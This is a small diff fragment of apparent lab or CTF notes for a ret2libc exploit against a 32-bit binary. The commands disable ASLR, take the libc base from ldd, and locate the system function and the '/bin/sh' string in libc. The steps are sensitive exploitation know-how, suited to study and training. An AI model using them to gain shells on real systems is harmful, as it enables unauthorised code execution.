@@ -68,3 +68,5 @@ payload=flat(
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ldd vulm-32 -> grab the libc.so.* address
 readelf -s /lib32/libc.so.6 | grep system -> address of system
+strings -a -t x /lib32/libc.so.6 | grep /bin/sh -> Getting the location of /bin/sh
+```
